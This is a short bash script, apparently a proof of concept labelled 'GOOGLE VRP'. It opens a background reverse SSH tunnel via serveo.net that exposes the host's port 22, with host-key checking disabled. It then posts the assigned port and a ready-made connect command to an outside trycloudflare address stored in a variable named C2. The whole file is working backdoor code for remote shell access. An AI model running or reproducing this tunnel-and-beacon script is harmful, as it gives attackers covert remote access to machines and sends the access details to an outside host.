#!/bin/bash
# URL: https://rainbow-nutrition-bottom-beginners.trycloudflare.com
C2="https://rainbow-nutrition-bottom-beginners.trycloudflare.com"

# --- THE SSH BRIDGE ---
# We use -f to background it and 0:localhost:22 to ask for a random port
ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -f -R 0:localhost:22 serveo.net sleep 3600 > /tmp/ssh_info 2>&1

# Wait 12 seconds for Serveo to assign the port
sleep 12

# This grabs the assigned port (e.g., 14523)
SSH_PORT=$(grep -o "forwarding TCP traffic from .*" /tmp/ssh_info | sed 's/.*serveo.net://')

{
  echo "--- GOOGLE VRP: SSH SESSION READY ---"
  echo "TIMESTAMP: $(date)"
  if [ -z "$SSH_PORT" ]; then
    echo "STATUS: Port not assigned yet. Full Log below:"
    cat /tmp/ssh_info
  else
    echo "SUCCESS! RUN THIS ON YOUR MAC:"
    echo "ssh -v -p $SSH_PORT root@serveo.net"
  fi
  echo "--------------------------------------"
} | curl -s -X POST --data-binary @- "$C2"
